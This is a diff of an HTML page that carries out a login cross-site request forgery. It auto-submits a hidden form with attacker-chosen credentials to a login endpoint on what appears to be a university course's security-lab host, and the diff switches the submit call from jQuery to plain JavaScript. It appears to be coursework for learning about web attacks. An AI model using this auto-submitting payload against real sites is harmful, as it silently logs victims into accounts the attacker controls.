@@ -2,14 +2,14 @@
     <body>
         <iframe style="display:none" name="invisible">
         </iframe>
-        <script src="https://cdn.bootcss.com/jquery/3.5.1/jquery.min.js"></script>
+        <!--<script src="https://cdn.bootcss.com/jquery/3.5.1/jquery.min.js"></script>-->
         <form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="POST", id='mf', target='invisible'>
             <input type="hidden" name="username" value="attacker" />
             <input type="hidden" name="password" value="l33th4x" />
         </form>
         <script>
-            //document.forms[0].submit();
-            $("#mf").submit();
+            document.forms[0].submit();
+            //$("#mf").submit();
         </script>
     </body>
 </html>
